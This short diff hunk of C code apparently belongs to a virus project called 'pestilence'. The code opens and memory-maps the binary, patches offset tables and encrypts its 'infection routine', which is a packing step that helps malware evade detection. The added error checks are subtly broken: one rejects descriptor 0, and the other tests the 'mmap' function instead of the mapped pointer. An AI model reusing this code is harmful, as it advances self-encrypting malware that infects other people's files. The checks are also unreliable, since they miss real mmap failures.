@@ -265,8 +265,14 @@ int main(void) {
 	void *mmaped;
 
 	fd = open("./pestilence", O_RDWR);
+	if (fd <= 0)
+		return (0);
 	fd_size = file_size(fd);
 	mmaped = mmap(0, fd_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+	if (!mmap) {
+		close(fd);
+		return (0);
+	}
 	patch_table_offset(mmaped);
 	patch_jmp_table_offset(mmaped);
 	encrypt_pestilence_infection_routine(mmaped);
